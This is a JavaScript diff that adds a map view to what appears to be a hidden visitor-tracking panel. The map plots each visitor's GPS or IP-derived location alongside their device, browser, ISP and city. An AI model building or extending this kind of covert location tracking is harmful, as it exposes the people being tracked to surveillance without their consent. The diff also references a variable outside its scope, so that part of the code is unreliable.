@@ -4071,6 +4184,144 @@ function backToProfiles(){
       })
       .catch(function(e){ _ds('_vd_fb_read','📖 DB Read: failed — '+e.message,false); });
   };
+
+  /* ── Tab switching ─────────────────────────────────────────
+     'list' = stats + breakdowns + table
+     'map'  = full-screen Leaflet map with visitor pins        */
+  var _leafletLoaded = false;
+  var _leafletMap    = null;
+
+  window._viTab = function(tab){
+    var lv = document.getElementById('_vi_listview');
+    var mv = document.getElementById('_vi_mapview');
+    var tl = document.getElementById('_tab_list');
+    var tm = document.getElementById('_tab_map');
+    if(tab === 'map'){
+      if(lv) lv.style.display = 'none';
+      if(mv){ mv.style.display = 'flex'; }
+      tl.style.background = 'transparent'; tl.style.color = '#7c7a9a';
+      tm.style.background = '#7c3aed';     tm.style.color = '#fff'; tm.style.fontWeight='600';
+      _viRenderMap();
+    } else {
+      if(lv) lv.style.display = 'contents';
+      if(mv) mv.style.display = 'none';
+      tl.style.background = '#7c3aed'; tl.style.color = '#fff'; tl.style.fontWeight='600';
+      tm.style.background = 'transparent'; tm.style.color = '#7c7a9a'; tm.style.fontWeight='';
+    }
+  };
+
+  /* ── Load Leaflet dynamically (only once, on first map open) ── */
+  function _loadLeaflet(cb){
+    if(_leafletLoaded){ cb(); return; }
+    /* CSS */
+    var css = document.getElementById('_leaflet_css');
+    css.href = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.css';
+    css.removeAttribute('disabled');
+    /* JS */
+    var s = document.createElement('script');
+    s.src = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.js';
+    s.onload = function(){ _leafletLoaded = true; cb(); };
+    document.head.appendChild(s);
+  }
+
+  /* ── Render Leaflet map with visitor pins ──────────────────── */
+  function _viRenderMap(){
+    _loadLeaflet(function(){
+      var mapEl = document.getElementById('_vi_map');
+      if(!mapEl) return;
+
+      /* Filter visits that have coordinates */
+      var pinnable = _data.filter(function(r){
+        return r.lat && r.lon &&
+               parseFloat(r.lat) !== 0 && parseFloat(r.lon) !== 0;
+      });
+      document.getElementById('_vi_mapcount').textContent =
+        pinnable.length + ' / ' + _data.length + ' visits have coordinates';
+
+      /* Init or reuse map */
+      if(!_leafletMap){
+        _leafletMap = L.map(mapEl, { zoomControl:true, attributionControl:true });
+        /* Dark tile layer — CartoDB Dark Matter, free, no key */
+        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+          attribution:'&copy; <a href="https://carto.com/">CARTO</a>',
+          subdomains:'abcd', maxZoom:19
+        }).addTo(_leafletMap);
+      } else {
+        /* Clear existing markers */
+        _leafletMap.eachLayer(function(l){
+          if(l instanceof L.Marker || l instanceof L.CircleMarker) _leafletMap.removeLayer(l);
+        });
+      }
+
+      if(!pinnable.length){
+        /* No coords yet — centre on Mumbai */
+        _leafletMap.setView([19.076, 72.877], 11);
+        L.popup().setLatLng([19.076,72.877])
+          .setContent('<div style="font-family:Outfit,sans-serif;font-size:12px;color:#111;">'
+            +'No GPS visits yet.<br>Re-track with location allowed.</div>')
+          .openOn(_leafletMap);
+        return;
+      }
+
+      /* Build markers */
+      var bounds = [];
+      pinnable.forEach(function(r, idx){
+        var lat = parseFloat(r.lat), lon = parseFloat(r.lon);
+        var isGPS = r.gps === 'yes';
+        bounds.push([lat, lon]);
+
+        /* Circle marker — green for GPS, amber for IP */
+        var marker = L.circleMarker([lat, lon], {
+          radius      : isGPS ? 9 : 7,
+          fillColor   : isGPS ? '#10b981' : '#f59e0b',
+          color       : isGPS ? '#065f46' : '#78350f',
+          weight      : 2,
+          opacity     : 1,
+          fillOpacity : 0.85
+        }).addTo(_leafletMap);
+
+        /* Click → show detail card */
+        marker.on('click', function(){
+          var card = document.getElementById('_vi_mapcard');
+          document.getElementById('_vi_mapcard_model').textContent =
+            (isGPS ? '📍 ' : '~ ') + (r.device || 'Unknown device');
+          document.getElementById('_vi_mapcard_body').innerHTML =
+            '<b>Time:</b> '    + (_fmtDate(r.ts)||'—') + '<br>' +
+            '<b>OS:</b> '      + _esc(r.os||'—')       + '<br>' +
+            '<b>Browser:</b> ' + _esc(r.browser||'—')  + '<br>' +
+            '<b>Network:</b> ' + _esc(r.connection||'—')+'<br>'+
+            '<b>City:</b> '    + _esc(r.city||'—')     + '<br>' +
+            '<b>ISP:</b> '     + _esc(r.isp||'—')      + '<br>' +
+            '<b>Coords:</b> <span style="font-family:monospace;font-size:11px;color:#c084fc;">'
+              + lat.toFixed(5) + ', ' + lon.toFixed(5) + '</span><br>'+
+            '<b>Accuracy:</b> '+(isGPS
+              ? '<span style="color:#10b981;">GPS ±'+(r.gps_accuracy_m||'?')+'m</span>'
+              : '<span style="color:#f59e0b;">IP estimate (±2–10km)</span>');
+          card.style.display = 'block';
+          /* Pan map to marker */
+          _leafletMap.panTo([lat, lon]);
+        });
+
+        /* Pulse animation for most recent GPS visit */
+        if(idx === 0 && isGPS){
+          L.circleMarker([lat, lon], {
+            radius:18, fillColor:'transparent',
+            color:'#10b981', weight:1.5, opacity:0.4, fillOpacity:0
+          }).addTo(_leafletMap);
+        }
+      });
+
+      /* Fit map to all pins */
+      if(bounds.length === 1){
+        _leafletMap.setView(bounds[0], isGPS ? 15 : 12);
+      } else {
+        _leafletMap.fitBounds(bounds, { padding:[40,40], maxZoom:15 });
+      }
+
+      /* Invalidate size (panel flex layout can confuse Leaflet) */
+      setTimeout(function(){ _leafletMap.invalidateSize(); }, 100);
+    });
+  }
 
   /* ── Force re-track (⚡ button in cheat panel) ─────────────
      Clears the session lock and fires a fresh track immediately.
